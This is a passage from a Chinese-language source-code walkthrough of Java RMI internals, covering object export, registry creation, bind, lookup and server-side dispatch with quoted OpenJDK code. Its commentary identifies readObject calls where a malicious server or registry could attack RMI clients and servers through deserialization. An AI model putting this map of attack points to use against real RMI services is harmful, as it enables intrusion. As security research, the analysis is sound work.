synchronized (this) &#123; listen(); exportCount++; &#125; /* * Try to add the Target to the exported object table; keep * counting this export (to keep server socket open) only if * that succeeds. */ boolean ok = false; try &#123; super.exportObject(target); ok = true; &#125; finally &#123; if (!ok) &#123; synchronized (this) &#123; decrementExportCount(); &#125; &#125; &#125;&#125; 上来调用了一个listen方法，看名字是开一个socket监听 12345678910111213141516171819202122232425262728293031323334353637private void listen() throws RemoteException &#123; assert Thread.holdsLock(this); TCPEndpoint ep = getEndpoint(); int port = ep.getPort(); if (server == null) &#123; if (tcpLog.isLoggable(Log.BRIEF)) &#123; tcpLog.log(Log.BRIEF, &quot;(port &quot; + port + &quot;) create server socket&quot;); &#125; try &#123; server = ep.newServerSocket(); /* * Don&#x27;t retry ServerSocket if creation fails since * &quot;port in use&quot; will cause export to hang if an * RMIFailureHandler is not installed. */ Thread t = AccessController.doPrivileged( new NewThreadAction(new AcceptLoop(server), &quot;TCP Accept-&quot; + port, true)); t.start(); &#125; catch (java.net.BindException e) &#123; throw new ExportException(&quot;Port already in use: &quot; + port, e); &#125; catch (IOException e) &#123; throw new ExportException(&quot;Listen failed on port: &quot; + port, e); &#125; &#125; else &#123; // otherwise verify security access to existing server socket SecurityManager sm = System.getSecurityManager(); if (sm != null) &#123; sm.checkListen(port); &#125; &#125;&#125; 首先获取了之前保存的TCPEndpoint和端口，然后调用了TCPEndpoint.newServerSocket，跟进去实际最后就是创建了个普通的ServerSocket。然后创建了一个新的AcceptLoop类的监听线程并开启。这里实际上就是客户端最后连接的socket，等后续分析客户端调用时再具体分析。那么实际上服务就已经发布出去了。最后还有一步记录已经发布的Target，调用了TransPort的exportObject 1234public void exportObject(Target target) throws RemoteException &#123; target.setExportedTransport(this); ObjectTable.putTarget(target);&#125; setExportedTransport就是把对应的TCPTransport保存进Target 12345void setExportedTransport(Transport exportedTransport) &#123; if (this.exportedTransport == null) &#123; this.exportedTransport = exportedTransport; &#125;&#125; putTarget是把对象和target绑定，放进ObjectTable这个类的静态变量objTable里面。 12345678910111213141516171819202122232425262728293031static void putTarget(Target target) throws ExportException &#123; ObjectEndpoint oe = target.getObjectEndpoint(); WeakRef weakImpl = target.getWeakImpl(); if (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123; DGCImpl.dgcLog.log(Log.VERBOSE, &quot;add object &quot; + oe); &#125; synchronized (tableLock) &#123; /** * Do nothing if impl has already been collected (see 6597112). Check while * holding tableLock to ensure that Reaper cannot process weakImpl in between * null check and put/increment effects. */ if (target.getImpl() != null) &#123; if (objTable.containsKey(oe)) &#123; throw new ExportException( &quot;internal error: ObjID already in use&quot;); &#125; else if (implTable.containsKey(weakImpl)) &#123; throw new ExportException(&quot;object already exported&quot;); &#125; objTable.put(oe, target); implTable.put(weakImpl, target); if (!target.isPermanent()) &#123; incrementKeepAliveCount(); &#125; &#125; &#125;&#125; 实际上在第三行的if语句里，因为获取了DGCImpl.dgcLog变量，触发了DGCImpl类的实例化。这是垃圾回收相关的类，跟进static代码块 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152static &#123; /* * &quot;Export&quot; the singleton DGCImpl in a context isolated from * the arbitrary current thread context. */ AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123; public Void run() &#123; ClassLoader savedCcl = Thread.currentThread().getContextClassLoader(); try &#123; Thread.currentThread().setContextClassLoader( ClassLoader.getSystemClassLoader()); /* * Put remote collector object in table by hand to prevent * listen on port. (UnicastServerRef.exportObject would * cause transport to listen.) */ try &#123; dgc = new DGCImpl(); ObjID dgcID = new ObjID(ObjID.DGC_ID); LiveRef ref = new LiveRef(dgcID, 0); UnicastServerRef disp = new UnicastServerRef(ref); Remote stub = Util.createProxy(DGCImpl.class, new UnicastRef(ref), true); disp.setSkeleton(dgc); Permissions perms = new Permissions(); perms.add(new SocketPermission(&quot;*&quot;, &quot;accept,resolve&quot;)); ProtectionDomain[] pd = &#123; new ProtectionDomain(null, perms) &#125;; AccessControlContext acceptAcc = new AccessControlContext(pd); Target target = AccessController.doPrivileged( new PrivilegedAction&lt;Target&gt;() &#123; public Target run() &#123; return new Target(dgc, disp, stub, dgcID, true); &#125; &#125;, acceptAcc); ObjectTable.putTarget(target); &#125; catch (RemoteException e) &#123; throw new Error( &quot;exception initializing server-side DGC&quot;, e); &#125; &#125; finally &#123; Thread.currentThread().setContextClassLoader(savedCcl); &#125; return null; &#125; &#125;);&#125; 使用单例模式创建了一个DGCImpl对象，这个对象就是RMI的分布式垃圾处理对象，一旦有远程对象被创建，就会实例化这个对象，但也只会创建这一次。后面的代码和UnicastServerRef#exportObject里很像，创建一个代理。但这里和前面不同的是这是一个系统内置类，所以是直接创建了DGCImpl_Stub类，而不是创建的动态代理。并且设置了disp的skeleton是DGCImpl_Skel。最后同样把这些放进Target，把Target保存进ObjectTable。按注释所写，这里没有调用TCPTransport#listen，所以没有开启监听。实际上根据TCPEndpoint#getLocalEndpoint，这个时候这个DGCImpl和刚才创建的远程对象用的是同一个TCPEndPoint。到这里服务发布就结束了。最后return了一个stub，但代码里并没有接收。这就是整个的远程对象RemoteObjImpl的创建过程，中间比较乱的地方是创建了一大堆对象，互相包含又互相引用。大概描述一下：最外层对象是Target，里面保存了远程对象、远程对象的代理对象stub、远程对象的引用对象UnicastServerRef、还有代表这个对象的ObjID。而远程对象里也保存了服务端远程引用对象UnicastServerRef，stub里保存了一个客户端远程引用UnicastRef，这两个引用里实际都保存了同一个LiveRef对象，里面保存了远程对象对应的ip和端口。而服务端上还有一个ObjectTable，每创建一个远程对象，就会把对应的Target保存到里面。目前已经创建了两个远程对象，分别是自定义远程对象和系统内置远程对象DGCImpl。那么第一行就分析完了。没错，目前就分析了一行。那么接下来分析第二行，LocateRegistry.createRegistry(1099) 创建注册中心跟进 123public static Registry createRegistry(int port) throws RemoteException &#123; return new RegistryImpl(port);&#125; 进构造函数 12345678910111213141516171819202122232425/** * Construct a new RegistryImpl on the specified port. */public RegistryImpl(int port) throws RemoteException&#123; if (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != null) &#123; // grant permission for default port only. try &#123; AccessController.doPrivileged(new PrivilegedExceptionAction&lt;Void&gt;() &#123; public Void run() throws RemoteException &#123; LiveRef lref = new LiveRef(id, port); setup(new UnicastServerRef(lref)); return null; &#125; &#125;, null, new SocketPermission(&quot;localhost:&quot;+port, &quot;listen,accept&quot;)); &#125; catch (PrivilegedActionException pae) &#123; throw (RemoteException)pae.getException(); &#125; &#125; else &#123; LiveRef lref = new LiveRef(id, port); setup(new UnicastServerRef(lref)); &#125;&#125; System.getSecurityManager()默认是null，走到else里面。其实主要就是创建了一个UnicastServerRef，里面放一个LiveRef，之后调用setup函数。跟进setup函数： 123456789private void setup(UnicastServerRef uref) throws RemoteException &#123; /* Server ref must be created and assigned before remote * object &#x27;this&#x27; can be exported. */ ref = uref; uref.exportObject(this, null, true); &#125; 这里其实和前面UnicastRemoteObject#exportObject一样，唯一区别就是第三个参数变成了true，虽然之前调用过这函数，还是粘一下 1234567891011121314151617181920212223public Remote exportObject(Remote impl, Object data, boolean permanent) throws RemoteException&#123; Class&lt;?&gt; implClass = impl.getClass(); Remote stub; try &#123; stub = Util.createProxy(implClass, getClientRef(), forceStubUse); &#125; catch (IllegalArgumentException e) &#123; throw new ExportException( &quot;remote object implements illegal remote interface&quot;, e); &#125; if (stub instanceof RemoteStub) &#123; setSkeleton(impl); &#125; Target target = new Target(impl, this, stub, ref.getObjID(), permanent); ref.exportObject(target); hashToMethod_Map = hashToMethod_Maps.get(implClass); return stub;&#125; 这次调用和发布远程对象时有点不同，和创建DGCImpl那里是一样的。首先创建的stub对象不是动态代理生成的了，而是直接找到了sun.rmi.registry.RegistryImpl_Stub，反射创建的。并且RegistryImpl_Stub是继承了RemoteStub的，所以会调用setSkeleton，跟进看一下 123456789101112131415public void setSkeleton(Remote impl) throws RemoteException &#123; if (!withoutSkeletons.containsKey(impl.getClass())) &#123; try &#123; skel = Util.createSkeleton(impl); &#125; catch (SkeletonNotFoundException e) &#123; /* * Ignore exception for skeleton class not found, because a * skeleton class is not necessary with the 1.2 stub protocol. * Remember that this impl&#x27;s class does not have a skeleton * class so we don&#x27;t waste time searching for it again. */ withoutSkeletons.put(impl.getClass(), null); &#125; &#125;&#125; 看下Util.createSkeleton 1234567891011121314151617181920static Skeleton createSkeleton(Remote object) throws SkeletonNotFoundException&#123; Class&lt;?&gt; cl; try &#123; cl = getRemoteClass(object.getClass()); &#125; catch (ClassNotFoundException ex ) &#123; throw new SkeletonNotFoundException( &quot;object does not implement a remote interface: &quot; + object.getClass().getName()); &#125; // now try to load the skeleton based ont he name of the class String skelname = cl.getName() + &quot;_Skel&quot;; try &#123; Class&lt;?&gt; skelcl = Class.forName(skelname, false, cl.getClassLoader()); return (Skeleton)skelcl.newInstance(); ......&#125; 其实和createStub一样，直接反射生成了sun.rmi.registry.RegistryImpl_Skel。接下来和之前一样了，创建Target然后发布。最后把Target放到ObjectTable里面，目前里面有RemoteObjImpl的Stub和RegistryImpl_Stub，还有个DGCImpl_Stub。那么注册中心的创建就结束了，实际上注册中心也是一个远程对象，整体过程和远程对象的发布基本是一样的，只是有些细节不太一样，主要就是没有用动态代理生成Stub，而是直接创建了jdk里面的类。接下来就是绑定了，来到第三行 绑定远程对象到注册中心RegistryImpl#bind 123456789101112public void bind(String name, Remote obj) throws RemoteException, AlreadyBoundException, AccessException &#123; // The access check preventing remote access is done in the skeleton // and is not applicable to local access. synchronized (bindings) &#123; Remote curr = bindings.get(name); if (curr != null) throw new AlreadyBoundException(name); bindings.put(name, obj); &#125; &#125; 这里其实非常简单，因为这里并不是远程绑定，就直接调用了RegistryImpl类，把名字和远程对象放到一个叫bindings的HashTable里面。到这里服务端的流程就走完了，接下来看客户端。 获取注册中心远程对象跟进LocateRegistry.getRegistry(“127.0.0.1”, 1099) 12345public static Registry getRegistry(String host, int port) throws RemoteException&#123; return getRegistry(host, port, null);&#125; 接着跟 1234567891011121314151617181920212223242526272829303132333435363738394041public static Registry getRegistry(String host, int port, RMIClientSocketFactory csf) throws RemoteException&#123; Registry registry = null; if (port &lt;= 0) port = Registry.REGISTRY_PORT; if (host == null || host.length() == 0) &#123; // If host is blank (as returned by &quot;file:&quot; URL in 1.0.2 used in // java.rmi.Naming), try to convert to real local host name so // that the RegistryImpl&#x27;s checkAccess will not fail. try &#123; host = java.net.InetAddress.getLocalHost().getHostAddress(); &#125; catch (Exception e) &#123; // If that failed, at least try &quot;&quot; (localhost) anyway... host = &quot;&quot;; &#125; &#125; /* * Create a proxy for the registry with the given host, port, and * client socket factory. If the supplied client socket factory is * null, then the ref type is a UnicastRef, otherwise the ref type * is a UnicastRef2. If the property * java.rmi.server.ignoreStubClasses is true, then the proxy * returned is an instance of a dynamic proxy class that implements * the Registry interface; otherwise the proxy returned is an * instance of the pregenerated stub class for RegistryImpl. **/ LiveRef liveRef = new LiveRef(new ObjID(ObjID.REGISTRY_ID), new TCPEndpoint(host, port, csf, null), false); RemoteRef ref = (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef); return (Registry) Util.createProxy(RegistryImpl.class, ref, false);&#125; 通过host和端口创建了一个LiveRef，用它又创建了一个UnicastRef，然后又调用Util.createProxy，根据前面分析这里创建的是一个RegistryImpl_Stub对象。和服务端不同的是这里的ref是一个UnicastRef而不是UnicastServerRef，因为一个对应客户端一个对应服务端。注意到实际上这个stub并不是从注册中心或者服务端传递过来的，而是直接根据host和port两个参数在客户端生成的，所以并不是rmi中所有stub都是通过序列化传递的。而且创建过程甚至不需要和注册中心通信，也就是说就算没有注册中心也可以创建这个注册中心stub，只不过后续肯定用不了。最后创建了这个RegistryImpl_Stub对象，接下来通过它去查找注册中心中的远程对象。 查找远程对象来到IRemoteObj remoteObj = (IRemoteObj) registry.lookup(“remoteObj”);这一行，跟进RegistryImpl_Stub#lookupopenjdk从jdk8u141版本才有RegistryImpl_Stub的源码，之前的jdk版本都调试不了这个类，但代码逻辑基本没变。 12345678910111213141516171819202122232425262728293031323334public java.rmi.Remote lookup(java.lang.String $param_String_1) throws java.rmi.AccessException, java.rmi.NotBoundException, java.rmi.RemoteException &#123; try &#123; java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) this, operations, 2, interfaceHash); try &#123; java.io.ObjectOutput out = call.getOutputStream(); out.writeObject($param_String_1); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e); &#125; ref.invoke(call); java.rmi.Remote $result; try &#123; java.io.ObjectInput in = call.getInputStream(); $result = (java.rmi.Remote) in.readObject(); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling return&quot;, e); &#125; catch (java.lang.ClassNotFoundException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling return&quot;, e); &#125; finally &#123; ref.done(call); &#125; return $result; &#125; catch (java.lang.RuntimeException e) &#123; throw e; &#125; catch (java.rmi.RemoteException e) &#123; throw e; &#125; catch (java.rmi.NotBoundException e) &#123; throw e; &#125; catch (java.lang.Exception e) &#123; throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e); &#125;&#125; 首先调用UnicastRef#newCall发起一个请求和注册中心建立连接。 123456789101112131415161718192021222324252627282930313233343536/** * Create an appropriate call object for a new call on this object. * Passing operation array and index, allows the stubs generator to * assign the operation indexes and interpret them. The RemoteRef * may need the operation to encode in for the call. */public RemoteCall newCall(RemoteObject obj, Operation[] ops, int opnum, long hash) throws RemoteException&#123; clientRefLog.log(Log.BRIEF, &quot;get connection&quot;); Connection conn = ref.getChannel().newConnection(); try &#123; clientRefLog.log(Log.VERBOSE, &quot;create call context&quot;); /* log information about the outgoing call */ if (clientCallLog.isLoggable(Log.VERBOSE)) &#123; logClientCall(obj, ops[opnum]); &#125; RemoteCall call = new StreamRemoteCall(conn, ref.getObjID(), opnum, hash); try &#123; marshalCustomCallData(call.getOutputStream()); &#125; catch (IOException e) &#123; throw new MarshalException(&quot;error marshaling &quot; + &quot;custom call data&quot;); &#125; return call; &#125; catch (RemoteException e) &#123; ref.getChannel().free(conn, false); throw e; &#125;&#125; 把要获取的远程对象名称写入输出流，之后调用了UnicastRef#invoke 12345678910public void invoke(RemoteCall call) throws Exception &#123; try &#123; clientRefLog.log(Log.VERBOSE, &quot;execute call&quot;); call.executeCall(); &#125; catch ......&#125; 调用了StreamRemoteCall#executeCall 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public void executeCall() throws Exception &#123; byte returnType; // read result header DGCAckHandler ackHandler = null; try &#123; if (out != null) &#123; ackHandler = out.getDGCAckHandler(); &#125; releaseOutputStream(); DataInputStream rd = new DataInputStream(conn.getInputStream()); byte op = rd.readByte(); if (op != TransportConstants.Return) &#123; if (Transport.transportLog.isLoggable(Log.BRIEF)) &#123; Transport.transportLog.log(Log.BRIEF, &quot;transport return code invalid: &quot; + op); &#125; throw new UnmarshalException(&quot;Transport return code invalid&quot;); &#125; getInputStream(); returnType = in.readByte(); in.readID(); // id for DGC acknowledgement &#125; catch (UnmarshalException e) &#123; throw e; &#125; catch (IOException e) &#123; throw new UnmarshalException(&quot;Error unmarshaling return header&quot;, e); &#125; finally &#123; if (ackHandler != null) &#123; ackHandler.release(); &#125; &#125; // read return value switch (returnType) &#123; case TransportConstants.NormalReturn: break; case TransportConstants.ExceptionalReturn: Object ex; try &#123; ex = in.readObject(); &#125; catch (Exception e) &#123; throw new UnmarshalException(&quot;Error unmarshaling return&quot;, e); &#125; // An exception should have been received, // if so throw it, else flag error if (ex instanceof Exception) &#123; exceptionReceivedFromServer((Exception) ex); &#125; else &#123; throw new UnmarshalException(&quot;Return type not Exception&quot;); &#125; // Exception is thrown before fallthrough can occur default: if (Transport.transportLog.isLoggable(Log.BRIEF)) &#123; Transport.transportLog.log(Log.BRIEF, &quot;return code invalid: &quot; + returnType); &#125; throw new UnmarshalException(&quot;Return code invalid&quot;); &#125;&#125; 发起网络调用，和服务端进行通信并获取结果，此时也触发了服务端监听线程的run方法，暂时不分析。特别注意当服务端返回异常时，会对输入流调用readObject，也就是说可以创建恶意服务端从这里攻击客户端。也就是只要调用了StreamRemoteCall#executeCall就可能被攻击，再往上一层，就是只要调用UnicastRef#invoke就会被攻击。实际上所有的Stub中都调用了UnicastRef#invoke，也就是RMI中所有的客户端调用都可能被攻击。回到调用逻辑，没有异常的话，就正常返回RegistryImpl_Stub#lookup，获取到数据流in后，调用了in.readObject获取远程对象的动态代理对象RemoteObjStub，所以这里就是一个反序列化触发点。那么如果注册中心可控，客户端lookup注册中心的时候就会被攻击。分析完了客户端的调用流程，分析下此时注册中心的调用流程，看看注册中心是怎么找到对应的远程对象的： 获取注册中心远程对象(注册中心端)之前分析过，发布远程对象时会调用TCPTransprt#listen，实际上listen里面开启了一个AcceptLoop线程，接收到网络请求时会调用它的run方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public void run() &#123; try &#123; executeAcceptLoop(); &#125; finally &#123; try &#123; /* * Only one accept loop is started per server * socket, so after no more connections will be * accepted, ensure that the server socket is no * longer listening. */ serverSocket.close(); &#125; catch (IOException e) &#123; &#125; &#125;&#125;/** * Accepts connections from the server socket and executes * handlers for them in the thread pool. **/private void executeAcceptLoop() &#123; if (tcpLog.isLoggable(Log.BRIEF)) &#123; tcpLog.log(Log.BRIEF, &quot;listening on port &quot; + getEndpoint().getPort()); &#125; while (true) &#123; Socket socket = null; try &#123; socket = serverSocket.accept(); /* * Find client host name (or &quot;0.0.0.0&quot; if unknown) */ InetAddress clientAddr = socket.getInetAddress(); String clientHost = (clientAddr != null ? clientAddr.getHostAddress() : &quot;0.0.0.0&quot;); /* * Execute connection handler in the thread pool, * which uses non-system threads. */ try &#123; connectionThreadPool.execute( new ConnectionHandler(socket, clientHost)); &#125; catch (RejectedExecutionException e) &#123; closeSocket(socket); tcpLog.log(Log.BRIEF, &quot;rejected connection from &quot; + clientHost); &#125; &#125; catch (Throwable t) &#123; ...... &#125; &#125;&#125; 然后调用TCPTransport#executeAcceptLoop，会开启新线程，跟进ConnectionHandler#run 123456789101112131415public void run() &#123; Thread t = Thread.currentThread(); String name = t.getName(); try &#123; t.setName(&quot;RMI TCP Connection(&quot; + connectionCount.incrementAndGet() + &quot;)-&quot; + remoteHost); AccessController.doPrivileged((PrivilegedAction&lt;Void&gt;)() -&gt; &#123; run0(); return null; &#125;, NOPERMS_ACC); &#125; finally &#123; t.setName(name); &#125;&#125; 跟进run0 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139private void run0() &#123; TCPEndpoint endpoint = getEndpoint(); int port = endpoint.getPort(); threadConnectionHandler.set(this); // set socket to disable Nagle&#x27;s algorithm (always send // immediately) // TBD: should this be left up to socket factory instead? try &#123; socket.setTcpNoDelay(true); &#125; catch (Exception e) &#123; // if we fail to set this, ignore and proceed anyway &#125; // set socket to timeout after excessive idle time try &#123; if (connectionReadTimeout &gt; 0) socket.setSoTimeout(connectionReadTimeout); &#125; catch (Exception e) &#123; // too bad, continue anyway &#125; try &#123; InputStream sockIn = socket.getInputStream(); InputStream bufIn = sockIn.markSupported() ? sockIn : new BufferedInputStream(sockIn); // Read magic (or HTTP wrapper) bufIn.mark(4); DataInputStream in = new DataInputStream(bufIn); int magic = in.readInt(); if (magic == POST) &#123; tcpLog.log(Log.BRIEF, &quot;decoding HTTP-wrapped call&quot;); // It&#x27;s really a HTTP-wrapped request. Repackage // the socket in a HttpReceiveSocket, reinitialize // sockIn and in, and reread magic. bufIn.reset(); // unread &quot;POST&quot; try &#123; socket = new HttpReceiveSocket(socket, bufIn, null); remoteHost = &quot;0.0.0.0&quot;; sockIn = socket.getInputStream(); bufIn = new BufferedInputStream(sockIn); in = new DataInputStream(bufIn); magic = in.readInt(); &#125; catch (IOException e) &#123; throw new RemoteException(&quot;Error HTTP-unwrapping call&quot;, e); &#125; &#125; // bufIn&#x27;s mark will invalidate itself when it overflows // so it doesn&#x27;t have to be turned off // read and verify transport header short version = in.readShort(); if (magic != TransportConstants.Magic || version != TransportConstants.Version) &#123; // protocol mismatch detected... // just close socket: this would recurse if we marshal an // exception to the client and the protocol at other end // doesn&#x27;t match. closeSocket(socket); return; &#125; OutputStream sockOut = socket.getOutputStream(); BufferedOutputStream bufOut = new BufferedOutputStream(sockOut); DataOutputStream out = new DataOutputStream(bufOut); int remotePort = socket.getPort(); if (tcpLog.isLoggable(Log.BRIEF)) &#123; tcpLog.log(Log.BRIEF, &quot;accepted socket from [&quot; + remoteHost + &quot;:&quot; + remotePort + &quot;]&quot;); &#125; TCPEndpoint ep; TCPChannel ch; TCPConnection conn; // send ack (or nack) for protocol byte protocol = in.readByte(); switch (protocol) &#123; case TransportConstants.SingleOpProtocol: // no ack for protocol // create dummy channel for receiving messages ep = new TCPEndpoint(remoteHost, socket.getLocalPort(), endpoint.getClientSocketFactory(), endpoint.getServerSocketFactory()); ch = new TCPChannel(TCPTransport.this, ep); conn = new TCPConnection(ch, socket, bufIn, bufOut); // read input messages handleMessages(conn, false); break; case TransportConstants.StreamProtocol: // send ack out.writeByte(TransportConstants.ProtocolAck); // suggest endpoint (in case client doesn&#x27;t know host name) if (tcpLog.isLoggable(Log.VERBOSE)) &#123; tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port + &quot;) &quot; + &quot;suggesting &quot; + remoteHost + &quot;:&quot; + remotePort); &#125; out.writeUTF(remoteHost); out.writeInt(remotePort); out.flush(); // read and discard (possibly bogus) endpoint // REMIND: would be faster to read 2 bytes then skip N+4 String clientHost = in.readUTF(); int clientPort = in.readInt(); if (tcpLog.isLoggable(Log.VERBOSE)) &#123; tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port + &quot;) client using &quot; + clientHost + &quot;:&quot; + clientPort); &#125; // create dummy channel for receiving messages // (why not use clientHost and clientPort?) ep = new TCPEndpoint(remoteHost, socket.getLocalPort(), endpoint.getClientSocketFactory(), endpoint.getServerSocketFactory()); ch = new TCPChannel(TCPTransport.this, ep); conn = new TCPConnection(ch, socket, bufIn, bufOut); // read input messages handleMessages(conn, true); break; ......&#125; 大部分都是在解析网络包之类的，看到有根据POST和JRMI关键字解析的代码。继续跟进调用流程，走进handleMessages 1234567891011121314151617181920212223242526272829303132333435/** * handleMessages decodes transport operations and handles messages * appropriately. If an exception occurs during message handling, * the socket is closed. */void handleMessages(Connection conn, boolean persistent) &#123; int port = getEndpoint().getPort(); try &#123; DataInputStream in = new DataInputStream(conn.getInputStream()); do &#123; int op = in.read(); // transport op if (op == -1) &#123; if (tcpLog.isLoggable(Log.BRIEF)) &#123; tcpLog.log(Log.BRIEF, &quot;(port &quot; + port + &quot;) connection closed&quot;); &#125; break; &#125; if (tcpLog.isLoggable(Log.BRIEF)) &#123; tcpLog.log(Log.BRIEF, &quot;(port &quot; + port + &quot;) op = &quot; + op); &#125; switch (op) &#123; case TransportConstants.Call: // service incoming RMI call RemoteCall call = new StreamRemoteCall(conn); if (serviceCall(call) == false) return; break; ......&#125; 根据读取的op不同进行不同的操作，一般就是走进第一个case，跟进serviceCall 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public boolean serviceCall(final RemoteCall call) &#123; try &#123; /* read object id */ final Remote impl; ObjID id; try &#123; id = ObjID.read(call.getInputStream()); &#125; catch (java.io.IOException e) &#123; throw new MarshalException(&quot;unable to read objID&quot;, e); &#125; /* get the remote object */ Transport transport = id.equals(dgcID) ? null : this; Target target = ObjectTable.getTarget(new ObjectEndpoint(id, transport)); if (target == null || (impl = target.getImpl()) == null) &#123; throw new NoSuchObjectException(&quot;no such object in table&quot;); &#125; final Dispatcher disp = target.getDispatcher(); target.incrementCallCount(); try &#123; /* call the dispatcher */ transportLog.log(Log.VERBOSE, &quot;call dispatcher&quot;); final AccessControlContext acc = target.getAccessControlContext(); ClassLoader ccl = target.getContextClassLoader(); ClassLoader savedCcl = Thread.currentThread().getContextClassLoader(); try &#123; setContextClassLoader(ccl); currentTransport.set(this); try &#123; java.security.AccessController.doPrivileged( new java.security.PrivilegedExceptionAction&lt;Void&gt;() &#123; public Void run() throws IOException &#123; checkAcceptPermission(acc); disp.dispatch(impl, call); return null; &#125; &#125;, acc); &#125; catch (java.security.PrivilegedActionException pae) &#123; throw (IOException) pae.getException(); &#125; &#125; finally &#123; setContextClassLoader(savedCcl); currentTransport.set(null); &#125; &#125; catch (IOException ex) &#123; ...... return true;&#125; 读取id，根据id到IbjectTable中查找对应的Target，获取Target中的远程引用disp，然后调用disp.dispatch，也就是UnicastServerRef#dispatch 123456789101112131415161718192021222324252627public void dispatch(Remote obj, RemoteCall call) throws IOException &#123; // positive operation number in 1.1 stubs; // negative version number in 1.2 stubs and beyond... int num; long op; try &#123; // read remote call header ObjectInput in; try &#123; in = call.getInputStream(); num = in.readInt(); &#125; catch (Exception readEx) &#123; throw new UnmarshalException(&quot;error unmarshalling call header&quot;, readEx); &#125; if (num &gt;= 0) &#123; if (skel != null) &#123; oldDispatch(obj, call, num); return; &#125; else &#123; throw new UnmarshalException( &quot;skeleton class not found but required &quot; + &quot;for client version&quot;); &#125; &#125; ...... skel != null时会调用oldDispatch，跟进 123456789101112131415161718192021222324252627private void oldDispatch(Remote obj, RemoteCall call, int op) throws Exception&#123; long hash; // hash for matching stub with skeleton // read remote call header ObjectInput in; in = call.getInputStream(); try &#123; Class&lt;?&gt; clazz = Class.forName(&quot;sun.rmi.transport.DGCImpl_Skel&quot;); if (clazz.isAssignableFrom(skel.getClass())) &#123; ((MarshalInputStream)in).useCodebaseOnly(); &#125; &#125; catch (ClassNotFoundException ignore) &#123; &#125; try &#123; hash = in.readLong(); &#125; catch (Exception ioe) &#123; throw new UnmarshalException(&quot;error unmarshalling call header&quot;, ioe); &#125; // if calls are being logged, write out object id and operation logCall(obj, skel.getOperations()[op]); unmarshalCustomCallData(in); // dispatch to skeleton for remote object skel.dispatch(obj, call, op, hash);&#125; unmarshalCustomCallData是空函数，所以来到了skel.dispatch，实际上也就是根据Skel的不同调用对应的dispatch方法，那这里就会调用RegistryImpl_Skel#dispatch这是jdk8u141里面的代码，旧版本是没有RegistryImpl.checkAccess的，也就是可以远程调用所有方法。加上这个限制后只能远程调用lookup和list方法了，其他方法只能本地调用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114public void dispatch(java.rmi.Remote obj, java.rmi.server.RemoteCall call, int opnum, long hash) throws java.lang.Exception &#123; if (hash != interfaceHash) throw new java.rmi.server.SkeletonMismatchException(&quot;interface hash mismatch&quot;); sun.rmi.registry.RegistryImpl server = (sun.rmi.registry.RegistryImpl) obj; switch (opnum) &#123; case 0: // bind(String, Remote) &#123; // Check access before reading the arguments RegistryImpl.checkAccess(&quot;Registry.bind&quot;); java.lang.String $param_String_1; java.rmi.Remote $param_Remote_2; try &#123; java.io.ObjectInput in = call.getInputStream(); $param_String_1 = (java.lang.String) in.readObject(); $param_Remote_2 = (java.rmi.Remote) in.readObject(); &#125; catch (java.io.IOException | java.lang.ClassNotFoundException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; server.bind($param_String_1, $param_Remote_2); try &#123; call.getResultStream(true); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break; &#125; case 1: // list() &#123; call.releaseInputStream(); java.lang.String[] $result = server.list(); try &#123; java.io.ObjectOutput out = call.getResultStream(true); out.writeObject($result); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break; &#125; case 2: // lookup(String) &#123; java.lang.String $param_String_1; try &#123; java.io.ObjectInput in = call.getInputStream(); $param_String_1 = (java.lang.String) in.readObject(); &#125; catch (java.io.IOException | java.lang.ClassNotFoundException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; java.rmi.Remote $result = server.lookup($param_String_1); try &#123; java.io.ObjectOutput out = call.getResultStream(true); out.writeObject($result); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break; &#125; case 3: // rebind(String, Remote) &#123; // Check access before reading the arguments RegistryImpl.checkAccess(&quot;Registry.rebind&quot;); java.lang.String $param_String_1; java.rmi.Remote $param_Remote_2; try &#123; java.io.ObjectInput in = call.getInputStream(); $param_String_1 = (java.lang.String) in.readObject(); $param_Remote_2 = (java.rmi.Remote) in.readObject(); &#125; catch (java.io.IOException | java.lang.ClassNotFoundException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; server.rebind($param_String_1, $param_Remote_2); try &#123; call.getResultStream(true); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break; &#125; case 4: // unbind(String) &#123; // Check access before reading the arguments RegistryImpl.checkAccess(&quot;Registry.unbind&quot;); java.lang.String $param_String_1; try &#123; java.io.ObjectInput in = call.getInputStream(); $param_String_1 = (java.lang.String) in.readObject(); &#125; catch (java.io.IOException | java.lang.ClassNotFoundException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; server.unbind($param_String_1); try &#123; 